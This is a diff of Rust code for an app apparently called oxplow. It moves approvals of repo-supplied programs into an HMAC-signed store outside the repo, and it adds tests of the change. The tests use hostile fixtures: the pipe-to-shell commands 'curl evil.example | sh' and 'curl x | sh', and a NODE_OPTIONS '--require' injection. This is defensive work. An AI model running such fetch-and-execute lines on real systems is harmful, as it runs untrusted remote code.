@@ -5,9 +5,11 @@
 //! cloned or pulled repo is untrusted, so none of these run until a person
 //! approves the program on this machine. An approval is bound to a hash of
 //! what runs (the program's content, plus its args or its network list), so
-//! a change needs approving again. Approvals live in the gitignored
-//! `.oxplow/source-approvals.json`, per machine: a teammate approves for
-//! themselves. Agents can't approve.
+//! a change needs approving again. Approvals live outside every repo
+//! ([`ApprovalStore`]: `<oxplow home>/approvals/`, each entry MACed under a
+//! keychain key), per machine: a teammate approves for themselves, a repo
+//! can't ship one, and an agent's shell can't forge one. Agents can't
+//! approve.
 //!
 //! Global-scope gauges are the user's own config and aren't gated.
 //! See `.context/semantic-layer.md` → "User and extension sources" and
@@ -18,36 +20,193 @@ use std::path::Path;
 
 use serde::{Deserialize, Serialize};
 
-/// Local (gitignored) consent file under `.oxplow/`.
-pub const APPROVALS_FILE: &str = "source-approvals.json";
+/// The approvals file oxplow used to keep inside the repo. It is never
+/// read: a repo could commit one, or an agent write one, and
+/// pre-approve its own programs.
+pub const LEGACY_APPROVALS_FILE: &str = "source-approvals.json";
+
+/// Keychain name of the key approvals are MACed with.
+const MAC_KEY_SECRET: &str = "approvals-mac-key";
+
+/// This machine's approvals of one project's programs (tsk344).
+///
+/// They live outside every repo, in `<oxplow home>/approvals/`, keyed
+/// by the canonical project path, so neither a committed file nor an
+/// in-tree write grants consent. Each entry also carries an HMAC under
+/// a random key kept in the OS keychain, so a process that can write
+/// files as the user (an agent's shell) still can't forge one.
+pub struct ApprovalStore {
+    file: Option<std::path::PathBuf>,
+    project: String,
+    secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
+    /// The MAC key, read from the keychain once per process (an unsigned
+    /// dev build re-prompts on every keychain read).
+    key: parking_lot::Mutex<Option<Vec<u8>>>,
+}
 
 #[derive(Debug, Default, Serialize, Deserialize)]
 struct ApprovalFile {
-    /// Approval key → the hash that was approved. Keys: `<ext>/<source>`,
-    /// `gauge:<key>`, `plugin:<name>`.
+    /// The project these approvals are for (for a person reading it).
     #[serde(default)]
-    approved: BTreeMap<String, String>,
+    project: String,
+    /// Approval key (`<ext>/<source>`, `gauge:<key>`, `plugin:<name>`,
+    /// `acp:<name>`) → the approved hash and its MAC.
+    #[serde(default)]
+    approved: BTreeMap<String, Approval>,
 }
 
-fn read(state_dir: &Path) -> ApprovalFile {
-    std::fs::read_to_string(state_dir.join(APPROVALS_FILE))
-        .ok()
-        .and_then(|t| serde_json::from_str(&t).ok())
-        .unwrap_or_default()
+#[derive(Debug, Clone, Serialize, Deserialize)]
+struct Approval {
+    hash: String,
+    mac: String,
 }
 
-/// Whether `key` is approved at exactly `hash`.
-pub fn is_approved(state_dir: &Path, key: &str, hash: &str) -> bool {
-    read(state_dir).approved.get(key).is_some_and(|h| h == hash)
+impl ApprovalStore {
+    /// The store for `project_dir` under the oxplow home (`None` when the
+    /// home dir can't be found: then nothing is ever approved).
+    pub fn for_project(
+        project_dir: &Path,
+        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
+    ) -> Self {
+        let file =
+            oxplow_config::global_config_dir().map(|home| approvals_file(&home, project_dir));
+        Self::new(file, project_dir, secrets)
+    }
+
+    /// A store at `file` (tests, in-memory services).
+    pub fn at(
+        file: std::path::PathBuf,
+        project_dir: &Path,
+        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
+    ) -> Self {
+        Self::new(Some(file), project_dir, secrets)
+    }
+
+    /// A store that approves nothing (a service built without one).
+    pub fn disabled() -> Self {
+        Self::new(
+            None,
+            Path::new(""),
+            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
+        )
+    }
+
+    /// A throwaway store for tests: under `dir`, with an in-memory keychain.
+    #[doc(hidden)]
+    pub fn for_tests(dir: &Path) -> Self {
+        Self::at(
+            dir.join(".test-oxplow-home/approvals.json"),
+            dir,
+            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
+        )
+    }
+
+    fn new(
+        file: Option<std::path::PathBuf>,
+        project_dir: &Path,
+        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
+    ) -> Self {
+        Self {
+            file,
+            project: canonical(project_dir).to_string_lossy().into_owned(),
+            secrets,
+            key: parking_lot::Mutex::new(None),
+        }
+    }
+
+    fn read(&self) -> ApprovalFile {
+        self.file
+            .as_ref()
+            .and_then(|f| std::fs::read_to_string(f).ok())
+            .and_then(|t| serde_json::from_str(&t).ok())
+            .unwrap_or_default()
+    }
+
+    /// The MAC key; created on first approval when `create`.
+    fn mac_key(&self, create: bool) -> Option<Vec<u8>> {
+        let mut cached = self.key.lock();
+        if let Some(k) = cached.as_ref() {
+            return Some(k.clone());
+        }
+        let stored = self.secrets.get(MAC_KEY_SECRET).ok().flatten();
+        let key = match stored {
+            Some(hex_key) => hex::decode(hex_key).ok()?,
+            None if create => {
+                let fresh: Vec<u8> = [uuid::Uuid::new_v4(), uuid::Uuid::new_v4()]
+                    .iter()
+                    .flat_map(|u| u.as_bytes().to_vec())
+                    .collect();
+                self.secrets
+                    .set(MAC_KEY_SECRET, &hex::encode(&fresh))
+                    .ok()?;
+                fresh
+            }
+            None => return None,
+        };
+        *cached = Some(key.clone());
+        Some(key)
+    }
+
+    fn mac(&self, key: &[u8], approval_key: &str, hash: &str) -> String {
+        use hmac::{KeyInit, Mac};
+        let Ok(mut m) = hmac::Hmac::<sha2::Sha256>::new_from_slice(key) else {
+            return String::new();
+        };
+        for part in [self.project.as_str(), approval_key, hash] {
+            m.update(part.as_bytes());
+            m.update(&[0u8]);
+        }
+        hex::encode(m.finalize().into_bytes())
+    }
+
+    /// Whether `key` is approved at exactly `hash`, by this machine.
+    pub fn is_approved(&self, key: &str, hash: &str) -> bool {
+        let Some(entry) = self.read().approved.get(key).cloned() else {
+            return false;
+        };
+        if entry.hash != hash {
+            return false;
+        }
+        self.mac_key(false)
+            .is_some_and(|k| !entry.mac.is_empty() && self.mac(&k, key, hash) == entry.mac)
+    }
+
+    /// Record a person's approval of `key` at `hash`.
+    pub fn approve(&self, key: &str, hash: &str) -> std::io::Result<()> {
+        let file = self
+            .file
+            .as_ref()
+            .ok_or_else(|| std::io::Error::other("no oxplow home dir to keep approvals in"))?;
+        let mac_key = self
+            .mac_key(true)
+            .ok_or_else(|| std::io::Error::other("the OS keychain is unavailable"))?;
+        let mut data = self.read();
+        data.project = self.project.clone();
+        data.approved.insert(
+            key.to_string(),
+            Approval {
+                hash: hash.to_string(),
+                mac: self.mac(&mac_key, key, hash),
+            },
+        );
+        if let Some(dir) = file.parent() {
+            std::fs::create_dir_all(dir)?;
+        }
+        let text = serde_json::to_string_pretty(&data).map_err(std::io::Error::other)?;
+        std::fs::write(file, text)
+    }
 }
 
-/// Record a person's approval of `key` at `hash`.
-pub fn approve(state_dir: &Path, key: &str, hash: &str) -> std::io::Result<()> {
-    let mut file = read(state_dir);
-    file.approved.insert(key.to_string(), hash.to_string());
-    std::fs::create_dir_all(state_dir)?;
-    let text = serde_json::to_string_pretty(&file).map_err(std::io::Error::other)?;
-    std::fs::write(state_dir.join(APPROVALS_FILE), text)
+fn canonical(p: &Path) -> std::path::PathBuf {
+    p.canonicalize().unwrap_or_else(|_| p.to_path_buf())
+}
+
+/// `<home>/approvals/<sha256 of the canonical project path>.json`.
+fn approvals_file(home: &Path, project_dir: &Path) -> std::path::PathBuf {
+    use sha2::{Digest, Sha256};
+    let digest = Sha256::digest(canonical(project_dir).to_string_lossy().as_bytes());
+    home.join("approvals")
+        .join(format!("{}.json", &hex::encode(digest)[..32]))
 }
 
 /// What kind of project program it is.
@@ -134,6 +293,7 @@ pub fn program_hash(project_dir: &Path, program: &str, args: &[String]) -> std::
 /// Whether `kind`/`name` running `program args` may run: approved on this
 /// machine at its current content and args.
 pub fn may_run(
+    store: &ApprovalStore,
     project_dir: &Path,
     kind: ProgramKind,
     name: &str,
@@ -148,14 +308,13 @@ pub fn may_run(
         env: Vec::new(),
         approved: false,
     };
-    approved_now(project_dir, &p)
+    approved_now(store, project_dir, &p)
 }
 
 /// Whether `p` is approved on this machine as it is now.
-fn approved_now(project_dir: &Path, p: &ProjectProgram) -> bool {
-    let state_dir = crate::AppLayout::for_project(project_dir).state_dir;
+fn approved_now(store: &ApprovalStore, project_dir: &Path, p: &ProjectProgram) -> bool {
     p.hash(project_dir)
-        .is_ok_and(|h| is_approved(&state_dir, &p.key(), &h))
+        .is_ok_and(|h| store.is_approved(&p.key(), &h))
 }
 
 /// A project ACP agent as a program to approve. Presets aren't project
@@ -172,8 +331,12 @@ pub fn acp_program(agent: &oxplow_config::AcpAgentConfig) -> ProjectProgram {
 }
 
 /// Whether a project ACP agent may start: approved as it is now.
-pub fn may_run_acp(project_dir: &Path, agent: &oxplow_config::AcpAgentConfig) -> bool {
-    approved_now(project_dir, &acp_program(agent))
+pub fn may_run_acp(
+    store: &ApprovalStore,
+    project_dir: &Path,
+    agent: &oxplow_config::AcpAgentConfig,
+) -> bool {
+    approved_now(store, project_dir, &acp_program(agent))
 }
 
 /// Why an unapproved program didn't run, for logs and errors.
@@ -191,7 +354,11 @@ pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
 
 /// Every project-scope exec gauge and collection plugin in `config`, with
 /// whether it's approved.
-pub fn list(project_dir: &Path, config: &oxplow_config::OxplowConfig) -> Vec<ProjectProgram> {
+pub fn list(
+    store: &ApprovalStore,
+    project_dir: &Path,
+    config: &oxplow_config::OxplowConfig,
+) -> Vec<ProjectProgram> {
     let mut out = Vec::new();
     let mut push = |kind, name: &str, program: Option<&str>, args: &[String]| {
         let Some(program) = program else { return };
@@ -229,7 +396,7 @@ pub fn list(project_dir: &Path, config: &oxplow_config::OxplowConfig) -> Vec<Pro
     }
     out.extend(config.acp_agents.iter().map(acp_program));
     for p in &mut out {
-        p.approved = approved_now(project_dir, p);
+        p.approved = approved_now(store, project_dir, p);
     }
     out
 }
@@ -237,25 +404,36 @@ pub fn list(project_dir: &Path, config: &oxplow_config::OxplowConfig) -> Vec<Pro
 /// Approve the project program `kind`/`name` as it is now. Only a person
 /// calls this (the Settings → Data button).
 pub fn approve_program(
+    store: &ApprovalStore,
     project_dir: &Path,
     config: &oxplow_config::OxplowConfig,
     kind: ProgramKind,
     name: &str,
 ) -> Result<(), String> {
-    let p = list(project_dir, config)
+    let p = list(store, project_dir, config)
         .into_iter()
         .find(|p| p.kind == kind && p.name == name)
         .ok_or_else(|| format!("no exec {kind:?} named `{name}` in the project's config"))?;
     let hash = p
         .hash(project_dir)
         .map_err(|e| format!("{}: {e}", p.program))?;
-    let state_dir = crate::AppLayout::for_project(project_dir).state_dir;
-    approve(&state_dir, &p.key(), &hash).map_err(|e| format!("record approval: {e}"))
+    store
+        .approve(&p.key(), &hash)
+        .map_err(|e| format!("record approval: {e}"))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// A store outside `dir`'s project tree, with an in-memory keychain.
+    fn store(home: &Path, project: &Path) -> ApprovalStore {
+        ApprovalStore::at(
+            approvals_file(home, project),
+            project,
+            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
+        )
+    }
 
     fn config(dir: &Path, yaml: &str) -> oxplow_config::OxplowConfig {
         std::fs::create_dir_all(dir.join(".oxplow")).unwrap();
@@ -266,6 +444,8 @@ mod tests {
     #[test]
     fn project_programs_run_only_once_approved_at_their_content_and_args() {
         let dir = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let st = store(home.path(), dir.path());
         std::fs::create_dir_all(dir.path().join("tools")).unwrap();
         std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
         std::fs::write(dir.path().join("tools/parse.sh"), "cat").unwrap();
@@ -273,7 +453,7 @@ mod tests {
             dir.path(),
             "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh, args: [--fast] }\n  - key: repo.star\n    emits: [repo.n]\n    compute: { runtime: starlark, entryFile: tools/x.star }\ncollection:\n  plugins:\n    - { name: acme.parse, kind: coverage, formats: [mine], runtime: exec, entryFile: tools/parse.sh }\n",
         );
-        let listed = list(dir.path(), &cfg);
+        let listed = list(&st, dir.path(), &cfg);
         assert_eq!(
             listed
                 .iter()
@@ -287,14 +467,16 @@ mod tests {
         );
         let args = vec!["--fast".to_string()];
         assert!(!may_run(
+            &st,
             dir.path(),
             ProgramKind::Gauge,
             "repo.count",
             "tools/count.sh",
             &args
         ));
-        approve_program(dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
+        approve_program(&st, dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
         assert!(may_run(
+            &st,
             dir.path(),
             ProgramKind::Gauge,
             "repo.count",
@@ -303,6 +485,7 @@ mod tests {
         ));
         // Different args or content: not what was approved.
         assert!(!may_run(
+            &st,
             dir.path(),
             ProgramKind::Gauge,
             "repo.count",
@@ -311,6 +494,7 @@ mod tests {
         ));
         std::fs::write(dir.path().join("tools/count.sh"), "curl evil.example | sh").unwrap();
         assert!(!may_run(
+            &st,
             dir.path(),
             ProgramKind::Gauge,
             "repo.count",
@@ -319,44 +503,110 @@ mod tests {
         ));
         // The plugin is still unapproved; approving one doesn't approve another.
         assert!(!may_run(
+            &st,
             dir.path(),
             ProgramKind::Plugin,
             "acme.parse",
             "tools/parse.sh",
             &[]
         ));
-        assert!(approve_program(dir.path(), &cfg, ProgramKind::Plugin, "nope").is_err());
+        assert!(approve_program(&st, dir.path(), &cfg, ProgramKind::Plugin, "nope").is_err());
     }
 
     #[test]
     fn project_acp_agents_need_approval_bound_to_command_args_env_and_file() {
         let dir = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let st = store(home.path(), dir.path());
         std::fs::create_dir_all(dir.path().join("tools")).unwrap();
         std::fs::write(dir.path().join("tools/agent"), "v1").unwrap();
         let cfg = config(
             dir.path(),
             "acpAgents:\n  - { name: mine, command: tools/agent, args: [--acp], env: { MODE: fast } }\n  - { name: gemini, command: gemini, args: [--acp] }\n",
         );
-        let listed = list(dir.path(), &cfg);
+        let listed = list(&st, dir.path(), &cfg);
         let acp: Vec<_> = listed
             .iter()
             .filter(|p| p.kind == ProgramKind::AcpAgent)
             .collect();
         assert_eq!(acp.len(), 2);
         assert_eq!(acp[0].env, vec!["MODE=fast".to_string()]);
-        assert!(!may_run_acp(dir.path(), &cfg.acp_agents[0]));
-        approve_program(dir.path(), &cfg, ProgramKind::AcpAgent, "mine").unwrap();
-        assert!(may_run_acp(dir.path(), &cfg.acp_agents[0]));
+        assert!(!may_run_acp(&st, dir.path(), &cfg.acp_agents[0]));
+        approve_program(&st, dir.path(), &cfg, ProgramKind::AcpAgent, "mine").unwrap();
+        assert!(may_run_acp(&st, dir.path(), &cfg.acp_agents[0]));
         // A different env, or a changed program file, isn't what was approved.
         let mut changed = cfg.acp_agents[0].clone();
         changed
             .env
             .insert("NODE_OPTIONS".into(), "--require ./x.js".into());
-        assert!(!may_run_acp(dir.path(), &changed));
+        assert!(!may_run_acp(&st, dir.path(), &changed));
         std::fs::write(dir.path().join("tools/agent"), "v2").unwrap();
-        assert!(!may_run_acp(dir.path(), &cfg.acp_agents[0]));
+        assert!(!may_run_acp(&st, dir.path(), &cfg.acp_agents[0]));
         // A PATH program is covered by its name and args.
-        approve_program(dir.path(), &cfg, ProgramKind::AcpAgent, "gemini").unwrap();
-        assert!(may_run_acp(dir.path(), &cfg.acp_agents[1]));
+        approve_program(&st, dir.path(), &cfg, ProgramKind::AcpAgent, "gemini").unwrap();
+        assert!(may_run_acp(&st, dir.path(), &cfg.acp_agents[1]));
+    }
+
+    #[test]
+    fn approvals_live_outside_the_project() {
+        let dir = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let f = approvals_file(home.path(), dir.path());
+        assert!(f.starts_with(home.path()));
+        assert!(!f.starts_with(dir.path()));
+        // Keyed by the canonical project path: another project gets another file.
+        let other = tempfile::tempdir().unwrap();
+        assert_ne!(f, approvals_file(home.path(), other.path()));
+    }
+
+    #[test]
+    fn a_repo_supplied_or_forged_approval_grants_nothing() {
+        let dir = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let st = store(home.path(), dir.path());
+        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
+        std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
+        let cfg = config(
+            dir.path(),
+            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\n",
+        );
+        let hash = program_hash(dir.path(), "tools/count.sh", &[]).unwrap();
+        let may = |st: &ApprovalStore| {
+            may_run(
+                st,
+                dir.path(),
+                ProgramKind::Gauge,
+                "repo.count",
+                "tools/count.sh",
+                &[],
+            )
+        };
+
+        // A committed (or agent-written) file in the repo, with the right hash.
+        std::fs::write(
+            dir.path().join(".oxplow").join(LEGACY_APPROVALS_FILE),
+            format!("{{\"approved\":{{\"gauge:repo.count\":\"{hash}\"}}}}"),
+        )
+        .unwrap();
+        assert!(!may(&st));
+
+        // A forged entry in the real store: right hash, no valid MAC.
+        let f = approvals_file(home.path(), dir.path());
+        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
+        std::fs::write(
+            &f,
+            format!(
+                "{{\"approved\":{{\"gauge:repo.count\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"
+            ),
+        )
+        .unwrap();
+        assert!(!may(&st));
+
+        // A person's approval works, and a copy MACed under another
+        // machine's key (another keychain) doesn't.
+        approve_program(&st, dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
+        assert!(may(&st));
+        let elsewhere = store(home.path(), dir.path());
+        assert!(!may(&elsewhere));
     }
 }
